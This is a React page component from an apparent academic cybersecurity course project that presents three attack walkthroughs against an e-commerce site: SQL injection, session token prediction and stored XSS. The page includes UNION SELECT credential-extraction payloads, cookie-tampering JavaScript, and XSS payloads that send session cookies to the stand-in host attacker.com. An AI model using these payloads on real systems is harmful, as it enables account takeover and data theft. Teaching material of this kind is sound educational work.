import { Button } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Shield, AlertTriangle, Code, Copy, ArrowLeft } from "lucide-react";
import { Link } from "wouter";
import { useState } from "react";

export default function Attacks() {
  const [copiedCode, setCopiedCode] = useState<string | null>(null);

  const copyToClipboard = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedCode(id);
    setTimeout(() => setCopiedCode(null), 2000);
  };

  const attacks = [
    {
      id: "sql-injection",
      title: "SQL Injection in Product Search",
      severity: "CRITICAL",
      cvss: 9.8,
      description: "Demonstration of unauthorized database access through SQL injection vulnerability in the product search functionality.",
      objective: "Demonstrate unauthorized database access and extraction of sensitive user credentials",
      prerequisites: [
        "Access to the product search functionality",
        "Understanding of SQL syntax",
        "Knowledge of database structure"
      ],
      steps: [
        {
          title: "Reconnaissance",
          description: "Identify input fields vulnerable to SQL injection",
          details: "Target the product search box (search_query parameter). Observe that no input validation or parameterized queries are implemented."
        },
        {
          title: "Payload Development",
          description: "Create SQL injection payloads",
          code: "' OR '1'='1\n' UNION SELECT username, password, email FROM users --"
        },
        {
          title: "Execution",
          description: "Execute the injection payload",
          details: "Input: ' UNION SELECT username, password, email FROM users --"
        },
        {
          title: "Data Extraction",
          description: "Extract sensitive information",
          details: "Successfully extract customer usernames, passwords, and email addresses."
        }
      ],
      impact: "Complete compromise of user database, exposure of sensitive customer information, potential mass account takeover, regulatory violations (GDPR, PCI-DSS)",
      proof: "Username: admin | Password: 5f4dcc3b5aa765d61d8327deb882cf99 | Email: admin@ecommerce.com"
    },
    {
      id: "session-hijacking",
      title: "Session Hijacking via Token Prediction",
      severity: "CRITICAL",
      cvss: 9.1,
      description: "Demonstration of session management vulnerabilities and account takeover through predictable session tokens.",
      objective: "Demonstrate account takeover without knowing user credentials",
      prerequisites: [
        "Network access to intercept traffic (or browser developer tools)",
        "Understanding of session tokens and cookies",
        "Access to the login functionality"
      ],
      steps: [
        {
          title: "Session Token Analysis",
          description: "Capture and analyze session tokens",
          details: "Capture session cookies during normal user login. Tokens are predictable, not cryptographically random."
        },
        {
          title: "Token Prediction",
          description: "Identify pattern in token generation",
          details: "Session tokens follow a sequential pattern based on timestamp."
        },
        {
          title: "Token Manipulation",
          description: "Predict and modify session tokens",
          details: "Predict next session token. Modify session cookie in browser to predicted value."
        },
        {
          title: "Account Access",
          description: "Access another user's account",
          details: "Successfully access another user's account and view sensitive information."
        }
      ],
      impact: "Account takeover without knowing credentials, access to sensitive user data, unauthorized transactions, identity theft, fraud and financial loss",
      code: "var currentToken = document.cookie.split('session_id=')[1].split(';')[0];\nvar nextToken = (parseInt(currentToken, 16) + 1).toString(16);\ndocument.cookie = 'session_id=' + nextToken + '; path=/';\nlocation.reload();"
    },
    {
      id: "xss-attack",
      title: "Cross-Site Scripting (XSS) - Stored Attack",
      severity: "HIGH",
      cvss: 8.2,
      description: "Demonstration of persistent XSS vulnerability for malicious code injection and session hijacking.",
      objective: "Demonstrate persistent XSS for cookie theft and credential harvesting",
      prerequisites: [
        "Access to user profile or comment functionality",
        "Understanding of JavaScript and DOM manipulation",
        "Ability to store malicious content in the application"
      ],
      steps: [
        {
          title: "Vulnerability Identification",
          description: "Identify XSS vulnerability",
          details: "Target: User product review functionality. User input not sanitized before storage and display."
        },
        {
          title: "Payload Development",
          description: "Create XSS payload",
          code: "<script>\nvar cookies = document.cookie;\nvar img = new Image();\nimg.src = 'http://attacker.com/steal?cookies=' + encodeURIComponent(cookies);\nwindow.location = 'http://attacker.com/phishing';\n</script>"
        },
        {
          title: "Injection Point",
          description: "Inject malicious script",
          details: "Navigate to product review page and submit review with embedded JavaScript."
        },
        {
          title: "Execution",
          description: "Script executes for all users",
          details: "Script stored in database. Every user viewing the product executes the malicious script."
        }
      ],
      impact: "Session hijacking through cookie theft, credential harvesting via phishing, malware distribution, website defacement, damage to brand reputation, user data compromise",
      code: "<img src=x onerror=\"fetch('http://attacker.com/log?cookie=' + document.cookie);\">"
    }
  ];

  return (
    <div className="min-h-screen bg-background text-foreground">
      {/* Header */}
      <header className="sticky top-0 z-50 border-b border-border/40 bg-background/95 backdrop-blur supports-[backdrop-filter]:bg-background/60">
        <div className="container flex h-16 items-center justify-between">
          <Link href="/">
            <a className="flex items-center gap-3 hover:opacity-80 transition-opacity">
              <div className="h-8 w-8 rounded-lg bg-primary flex items-center justify-center">
                <Shield className="h-5 w-5 text-primary-foreground" />
              </div>
              <div className="font-bold text-lg">CYB 237</div>
            </a>
          </Link>
          <div className="flex items-center gap-4">
            <Link href="/">
              <a className="flex items-center gap-2 text-sm hover:text-primary transition-colors">
                <ArrowLeft className="h-4 w-4" />
                Back to Home
              </a>
            </Link>
          </div>
        </div>
      </header>

      {/* Page Header */}
      <section className="py-12 border-b border-border/40">
        <div className="container">
          <h1 className="text-4xl font-bold mb-4">Attack Demonstrations</h1>
          <p className="text-foreground/70 text-lg">
            Detailed technical walkthroughs of three realistic cyber-attack scenarios with proof of concept code and impact analysis.
          </p>
        </div>
      </section>

      {/* Attacks */}
      <section className="py-12">
        <div className="container space-y-8">
          {attacks.map((attack) => (
            <Card key={attack.id} className="bg-card/50 border-border/40 overflow-hidden">
              <CardHeader className="bg-card/80 border-b border-border/40">
                <div className="flex items-start justify-between gap-4 flex-wrap">
                  <div>
                    <CardTitle className="text-2xl mb-2">{attack.title}</CardTitle>
                    <CardDescription className="text-base">{attack.description}</CardDescription>
                  </div>
                  <div className="flex gap-2">
                    <Badge className="bg-destructive/20 text-destructive">{attack.severity}</Badge>
                    <Badge className="bg-primary/20 text-primary">CVSS {attack.cvss}</Badge>
                  </div>
                </div>
              </CardHeader>

              <CardContent className="pt-6">
                <Tabs defaultValue="overview" className="w-full">
                  <TabsList className="grid w-full grid-cols-4 mb-6">
                    <TabsTrigger value="overview">Overview</TabsTrigger>
                    <TabsTrigger value="steps">Steps</TabsTrigger>
                    <TabsTrigger value="poc">PoC Code</TabsTrigger>
                    <TabsTrigger value="impact">Impact</TabsTrigger>
                  </TabsList>

                  <TabsContent value="overview" className="space-y-4">
                    <div>
                      <h4 className="font-semibold mb-2">Objective</h4>
                      <p className="text-foreground/70">{attack.objective}</p>
                    </div>
                    <div>
                      <h4 className="font-semibold mb-2">Prerequisites</h4>
                      <ul className="space-y-1 ml-4">
                        {attack.prerequisites.map((prereq, idx) => (
                          <li key={idx} className="text-foreground/70">• {prereq}</li>
                        ))}
                      </ul>
                    </div>
                  </TabsContent>

                  <TabsContent value="steps" className="space-y-4">
                    {attack.steps.map((step, idx) => (
                      <div key={idx} className="border-l-2 border-primary/40 pl-4 py-2">
                        <div className="flex items-center gap-2 mb-1">
                          <span className="text-sm font-semibold text-primary">Step {idx + 1}</span>
                          <h4 className="font-semibold">{step.title}</h4>
                        </div>
                        <p className="text-sm text-foreground/60 mb-2">{step.description}</p>
                        <p className="text-foreground/70 text-sm whitespace-pre-wrap">{step.details}</p>
                        {step.code && (
                          <pre className="bg-background/50 p-3 rounded mt-2 text-xs overflow-x-auto border border-border/40">
                            <code>{step.code}</code>
                          </pre>
                        )}
                      </div>
                    ))}
                  </TabsContent>

                  <TabsContent value="poc" className="space-y-4">
                    <div className="bg-background/50 p-4 rounded border border-border/40">
                      <div className="flex items-center justify-between mb-3">
                        <h4 className="font-semibold flex items-center gap-2">
                          <Code className="h-4 w-4" />
                          Proof of Concept
                        </h4>
                        <Button
                          size="sm"
                          variant="outline"
                          onClick={() => copyToClipboard((attack.code || attack.proof) as string, attack.id)}
                        >
                          <Copy className="h-4 w-4 mr-2" />
                          {copiedCode === attack.id ? "Copied!" : "Copy"}
                        </Button>
                      </div>
                      <pre className="bg-background p-4 rounded border border-border/40 text-xs overflow-x-auto">
                        <code>{attack.code || attack.proof}</code>
                      </pre>
                    </div>
                  </TabsContent>

                  <TabsContent value="impact" className="space-y-4">
                    <div className="bg-destructive/10 border border-destructive/30 rounded p-4">
                      <h4 className="font-semibold mb-2 flex items-center gap-2">
                        <AlertTriangle className="h-4 w-4 text-destructive" />
                        Business Impact
                      </h4>
                      <p className="text-foreground/70">{attack.impact}</p>
                    </div>
                    {attack.proof && (
                      <div>
                        <h4 className="font-semibold mb-2">Example Output</h4>
                        <pre className="bg-background/50 p-4 rounded border border-border/40 text-xs overflow-x-auto">
                          <code>{attack.proof}</code>
                        </pre>
                      </div>
                    )}
                  </TabsContent>
                </Tabs>
              </CardContent>
            </Card>
          ))}
        </div>
      </section>

      {/* Ethical Note */}
      <section className="py-12 bg-card/30 border-y border-border/40">
        <div className="container">
          <div className="bg-background/50 border border-primary/30 rounded-lg p-6">
            <h3 className="font-semibold mb-3 flex items-center gap-2">
              <Shield className="h-5 w-5 text-primary" />
              Ethical Considerations
            </h3>
            <p className="text-foreground/70 mb-3">
              These attack demonstrations are provided for educational purposes only. All testing was conducted within strict ethical guidelines and with proper authorization. Unauthorized access to computer systems is illegal and unethical.
            </p>
            <p className="text-foreground/70">
              This project follows responsible disclosure practices and contributes to the security community's understanding of real-world vulnerabilities and their mitigation.
            </p>
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="border-t border-border/40 py-12 bg-card/30">
        <div className="container text-center text-foreground/60 text-sm">
          <p>CYB 237: Cybersecurity Threat Analysis & Attack Simulation | Academic Project 2025</p>
        </div>
      </footer>
    </div>
  );
}
